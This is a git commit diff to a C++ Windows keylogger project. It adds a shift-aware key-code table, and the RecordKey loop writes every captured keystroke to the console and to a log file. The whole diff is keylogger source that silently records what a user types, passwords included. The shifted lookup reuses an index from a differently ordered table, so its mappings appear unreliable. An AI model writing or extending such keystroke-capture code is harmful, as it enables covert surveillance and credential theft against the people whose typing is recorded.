62fcd7ade8248e072f1b2df720b406eb3c2a1150
Gavish Bansal <gavybansal9911@gmail.com>
2024-03-27 12:30:32 +0530

    Handle shift press

--- KeyLogger/KeyLogger/KeyLogger.cpp
+++ KeyLogger/KeyLogger/KeyLogger.cpp
@@ -61,6 +61,62 @@ std::tuple<int, std::string> keyNames[255] = {
     {16, "LeftShift"}
 };
 
+std::tuple<int, std::string> keyNames_ShiftPressed[255] = {
+        { 0, "Undefined" },
+    { 27, "Escape" },      // ASCII code for Escape
+    { 49, "!" },           // ASCII code for '1'
+    { 50, "@" },           // ASCII code for '2'
+    { 51, "#" },           // ASCII code for '3'
+    { 52, "$" },           // ASCII code for '4'
+    { 53, "%" },           // ASCII code for '5'
+    { 54, "^" },           // ASCII code for '6'
+    { 55, "&" },           // ASCII code for '7'
+    { 56, "*" },           // ASCII code for '8'
+    { 57, "(" },           // ASCII code for '9'
+    { 48, ")" },           // ASCII code for '0'
+    { 189, "_" },       // ASCII code for '-'
+    { 187, "+" },      // ASCII code for '='
+    { 8, "\b" },           // ASCII code for Backspace
+    { 9, "\t" },           // ASCII code for Tab
+    { 219, "{" },            // ASCII code for '['
+    { 221, "}" },             // ASCII code for ']'
+    { 13, "\n" },           // ASCII code for Enter
+    { 17, "LeftControl" }, // ASCII code for Left Control
+    { 162, "LeftControl" }, // ASCII code for Left Control
+    { 163, "RightControl" }, // ASCII code for Right Control
+    {32, " "},
+    {65, "A"},
+    {66, "B"},
+    {67, "C"},
+    {68, "D"},
+    {69, "E"},
+    {70, "F"},
+    {71, "G"},
+    {72, "H"},
+    {73, "I"},
+    {74, "J"},
+    {75, "K"},
+    {76, "L"},
+    {77, "M"},
+    {78, "N"},
+    {79, "O"},
+    {80, "P"},
+    {81, "Q"},
+    {82, "R"},
+    {83, "S"},
+    {84, "T"},
+    {85, "U"},
+    {86, "V"},
+    {87, "W"},
+    {88, "X"},
+    {89, "Y"},
+    {90, "Z"},
+    {20, "CapsLock"},
+    {18, "Alt"},
+    {164, "Alt"},
+    {16, "LeftShift"}
+};
+
 void RecordKey(bool bShiftDown)
 {
     // TODO: handle key logs when shift down
@@ -79,9 +135,18 @@ void RecordKey(bool bShiftDown)
                 {
                     if (i == std::get<int>(keyNames[j]))
                     {
-                        std::cout << std::get<std::string>(keyNames[j]) << std::endl;
-                        fout << std::get<std::string>(keyNames[j]) << "";
-                        break;
+                        if (bShiftDown)
+                        {
+                            std::cout << std::get<std::string>(keyNames_ShiftPressed[j]) << std::endl;
+                            fout << std::get<std::string>(keyNames_ShiftPressed[j]) << "";
+                            break;
+                        }
+                        else
+                        {
+                            std::cout << std::get<std::string>(keyNames[j]) << std::endl;
+                            fout << std::get<std::string>(keyNames[j]) << "";
+                            break;
+                        }
                     }
                 }
                 fout.close();
@@ -105,9 +170,10 @@ int main()
     while (true)
     {
         bShiftPressed = IsShiftPressed();
-        std::cout << bShiftPressed << std::endl;
 
+        Sleep(115);
         RecordKey(bShiftPressed);
-        Sleep(112.5);
+
+    	bShiftPressed = false;
     }
 }
